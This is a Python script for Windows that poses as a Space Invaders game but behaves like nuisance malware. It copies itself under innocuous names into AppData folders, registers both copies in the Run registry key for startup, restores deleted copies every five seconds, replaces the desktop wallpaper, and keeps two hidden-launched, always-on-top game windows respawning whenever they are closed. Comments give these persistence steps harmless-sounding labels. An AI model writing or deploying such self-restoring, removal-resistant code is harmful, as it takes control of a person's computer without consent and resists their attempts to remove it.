import os
import subprocess
import time
import ctypes
import shutil
import sys
import threading
import winreg

def add_to_registry():
    """Add to Windows Registry for startup."""
    try:
        backup_paths = create_alternate_copies()
        for path in backup_paths:
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            app_name = os.path.splitext(os.path.basename(path))[0]
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, f'pythonw "{path}"')
    except Exception as e:
        print(f"Configuration error: {e}")

def create_alternate_copies():
    """Create backup copies in user directories."""
    user_paths = [
        os.path.join(os.getenv("APPDATA"), "Microsoft", "Templates"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Temp")
    ]
    
    source_path = os.path.abspath(__file__)
    backup_files = ["background_service.pyw", "scheduler.pyw"]
    
    for path in user_paths:
        os.makedirs(path, exist_ok=True)
    
    result_paths = []
    for path, name in zip(user_paths, backup_files):
        target = os.path.join(path, name)
        result_paths.append(target)
        try:
            if not os.path.exists(target) or os.path.getsize(target) != os.path.getsize(source_path):
                shutil.copy2(source_path, target)
        except Exception as e:
            print(f"File operation error: {e}")

    return result_paths

def monitor_and_restore(backup_paths):
    """Monitor both copies and restore if one is deleted."""
    while True:
        for i, path in enumerate(backup_paths):
            if not os.path.exists(path):
                source_path = backup_paths[(i + 1) % 2]
                if os.path.exists(source_path):
                    try:
                        shutil.copy2(source_path, path)
                    except Exception as e:
                        print(f"Restore error: {e}")
        time.sleep(5)

def set_space_wallpaper():
    """Download and set a space-themed wallpaper."""
    import requests
    wallpaper_url = "https://images.unsplash.com/photo-1444703686981-a3abbc4d4fe3"
    wallpaper_path = os.path.join(os.getcwd(), "space_wallpaper.jpg")

    try:
        print("Downloading space-themed wallpaper...")
        response = requests.get(wallpaper_url)
        with open(wallpaper_path, "wb") as f:
            f.write(response.content)

        print("Setting wallpaper...")
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)
    except Exception as e:
        print(f"Wallpaper error: {e}")

def write_space_invaders_game():
    """Write a simple Space Invaders game to a hidden Python file."""
    game_script = "space_invaders_game.pyw"
    
    current_dir = os.getcwd()
    print(f"Current working directory: {current_dir}")
    
    monster_src = r"C:\Users\Andywandy\Downloads\space-invaders-monster-1693465088007.webp"
    ship_src = r"C:\Users\Andywandy\Downloads\Space-Invaders-Ship-PNG-Pic.png"
    monster_dest = os.path.join(current_dir, "invader_monster.webp")
    ship_dest = os.path.join(current_dir, "player_ship.png")
    
    try:
        if os.path.exists(monster_src):
            shutil.copy(monster_src, monster_dest)
        if os.path.exists(ship_src):
            shutil.copy(ship_src, ship_dest)
    except Exception as e:
        print(f"Image copy error: {e}")
    
    if not os.path.exists(game_script):
        with open(game_script, "w") as f:
            f.write("""import pygame, sys
from pygame.locals import *
from random import randint

pygame.init()
screen = pygame.display.set_mode((800, 600))
pygame.display.set_caption("Space Invaders")
font = pygame.font.SysFont("Arial", 30)
clock = pygame.time.Clock()

try:
    INVADER_IMG = pygame.image.load("invader_monster.webp")
    INVADER_IMG = pygame.transform.scale(INVADER_IMG, (40, 40))
except Exception as e:
    INVADER_IMG = None

try:
    PLAYER_IMG = pygame.image.load("player_ship.png")
    PLAYER_IMG = pygame.transform.scale(PLAYER_IMG, (50, 50))
except Exception as e:
    PLAYER_IMG = None

WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
GREEN = (0, 255, 0)
RED = (255, 0, 0)
YELLOW = (255, 255, 0)

game_over = False
score = 0

def main():
    global game_over, score
    # Set window to be always on top
    os.environ['SDL_VIDEO_WINDOW_POS'] = '0,0'
    screen = pygame.display.set_mode((800, 600), pygame.NOFRAME)  # Remove window frame
    hwnd = pygame.display.get_wm_info()["window"]
    
    # Win32 API constants
    HWND_TOPMOST = -1
    SWP_NOMOVE = 0x0002
    SWP_NOSIZE = 0x0001
    
    # Set window to always on top
    ctypes.windll.user32.SetWindowPos(
        hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE
    )
    
    player = pygame.Rect(375, 500, 50, 50)
    bullets = []
    invaders = [pygame.Rect(randint(0, 750), randint(0, 300), 40, 40) for _ in range(5)]
    
    while True:
        screen.fill(BLACK)
        score_text = font.render(f'Score: {score}', True, WHITE)
        screen.blit(score_text, (10, 10))
        
        if not game_over:
            if PLAYER_IMG:
                screen.blit(PLAYER_IMG, player)
            else:
                pygame.draw.rect(screen, GREEN, player)
            
            for bullet in bullets[:]:
                bullet.y -= 5
                if bullet.y < 0:
                    bullets.remove(bullet)
                pygame.draw.rect(screen, RED, bullet)
                
                for invader in invaders[:]:
                    if bullet.colliderect(invader):
                        if invader in invaders:
                            invaders.remove(invader)
                        if bullet in bullets:
                            bullets.remove(bullet)
                        score += 10
                        
            for invader in invaders:
                if INVADER_IMG:
                    screen.blit(INVADER_IMG, invader)
                else:
                    pygame.draw.rect(screen, YELLOW, invader)
                if invader.colliderect(player):
                    game_over = True
            
            if len(invaders) == 0:
                invaders.extend([pygame.Rect(randint(0, 750), randint(0, 300), 40, 40) for _ in range(5)])
        
        else:
            game_over_text = font.render('Game Over! Press R to restart', True, WHITE)
            screen.blit(game_over_text, (250, 300))
        
        pygame.display.flip()
        
        for event in pygame.event.get():
            if event.type == QUIT:
                pygame.quit()
                sys.exit()
            if event.type == KEYDOWN:
                if event.key == K_ESCAPE:
                    pygame.quit()
                    sys.exit()
                if event.key == K_SPACE and not game_over:
                    bullets.append(pygame.Rect(player.x + 20, player.y, 10, 20))
                if event.key == K_r and game_over:
                    game_over = False
                    score = 0
                    player.x = 375
                    bullets.clear()
                    invaders.clear()
                    invaders.extend([pygame.Rect(randint(0, 750), randint(0, 300), 40, 40) for _ in range(5)])
        
        keys = pygame.key.get_pressed()
        if not game_over:
            if keys[K_LEFT] and player.x > 0:
                player.x -= 5
            if keys[K_RIGHT] and player.x < 750:
                player.x += 5
        
        clock.tick(60)

if __name__ == "__main__":
    main()
""")

    return game_script

def ensure_two_instances_running(game_script, exe_path=None):
    """Maintain two instances of the application."""
    active_processes = []

    print("Starting application instances...")
    for _ in range(2):
        if not os.path.exists(game_script):
            print(f"Recreating configuration: {game_script}")
            write_space_invaders_game()
        try:
            if exe_path:
                proc = subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                proc = subprocess.Popen(["pythonw", game_script], creationflags=subprocess.CREATE_NO_WINDOW)
            active_processes.append(proc)
        except Exception as e:
            print(f"Process error: {e}")

    try:
        while True:
            for i in range(2):
                if active_processes[i].poll() is not None:  # Process has terminated
                    print(f"Restarting instance {i + 1}...")
                    try:
                        if exe_path:
                            active_processes[i] = subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NO_WINDOW)
                        else:
                            active_processes[i] = subprocess.Popen(["pythonw", game_script], creationflags=subprocess.CREATE_NO_WINDOW)
                    except Exception as e:
                        print(f"Restart error: {e}")
            time.sleep(0.1)  # Reduced sleep time for faster response
            
    except KeyboardInterrupt:
        print("Cleaning up resources...")
        for proc in active_processes:
            proc.terminate()

def main():
    # Create redundant copies and add to registry
    backup_paths = create_alternate_copies()
    add_to_registry()
    
    # Start monitoring in a separate thread
    monitor_thread = threading.Thread(target=monitor_and_restore, args=(backup_paths,), daemon=True)
    monitor_thread.start()
    
    # Continue with normal execution
    set_space_wallpaper()
    game_script = write_space_invaders_game()
    
    # Check for external .exe argument
    exe_path = sys.argv[1] if len(sys.argv) > 1 else None
    if exe_path and os.path.exists(exe_path):
        print(f"Using provided .exe: {exe_path}")
        ensure_two_instances_running(game_script, exe_path)
    else:
        print("Using generated Python script.")
        ensure_two_instances_running(game_script)

if __name__ == "__main__":
    main()
